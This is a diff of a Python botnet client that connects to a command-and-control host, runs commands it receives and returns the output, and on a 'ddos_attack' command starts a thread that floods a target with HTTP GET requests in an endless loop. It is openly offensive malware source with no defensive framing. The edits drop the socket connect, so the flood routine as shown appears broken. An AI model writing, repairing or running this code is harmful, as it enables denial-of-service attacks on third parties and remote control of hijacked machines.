@@ -5,8 +5,8 @@ import os
 import threading
 
 # The IP address and port of the main host
-host = 'YOUR_MAIN_HOST_IP'
-port = YOUR_MAIN_HOST_PORT
+host = '127.0.0.1'
+port = 1234
 
 def connect_to_main_host():
     # Connect to the main host
@@ -28,7 +28,7 @@ def connect_to_main_host():
             main_host.send(result.encode())
         elif command.lower().startswith('ddos_attack'):
             # Extract the target IP and port from the command
-            _, target_ip, target_port = command.split(',')
+            target_ip,target_port = command.split(',')
 
             # Start a new thread to perform the DDoS attack on the specified target
             ddos_thread = threading.Thread(target=ddos_attack, args=(target_ip, int(target_port)))
@@ -60,16 +60,10 @@ def ddos_attack(target_ip, target_port):
     # Create a socket object
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-    # Connect to the target IP and port
-    try:
-        sock.connect((target_ip, target_port))
-    except socket.error as e:
-        print(f"Failed to connect to {target_ip}:{target_port}: {str(e)}")
-        return
 
-    # Send a flood of requests to overwhelm the target
     while True:
         try:
+            print("Attacking ......")
             sock.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
         except socket.error:
             break
